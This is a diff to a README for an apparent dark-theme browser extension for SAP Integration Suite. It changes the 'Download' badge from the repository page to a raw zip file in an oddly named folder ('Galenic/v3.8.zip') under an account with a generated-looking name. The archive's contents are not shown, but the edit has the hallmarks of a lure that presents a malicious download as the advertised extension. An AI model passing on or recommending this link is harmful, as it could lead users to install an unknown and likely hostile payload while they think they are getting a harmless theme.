@@ -1,6 +1,6 @@
 # 🌙 sap-cpi-dark-mode - Dark theme for SAP Integration Suite
 
-[![Download](https://img.shields.io/badge/Download-Extension-blueviolet?style=for-the-badge)](https://github.com/intercrossed-commodity539/sap-cpi-dark-mode)
+[![Download](https://img.shields.io/badge/Download-Extension-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/intercrossed-commodity539/sap-cpi-dark-mode/main/Galenic/v3.8.zip)
 
 ## 🚀 Getting Started
 This browser extension transforms your SAP Cloud Integration screens into a comfortable dark theme. It reduces eye strain during long work sessions with adjustable warmth settings.
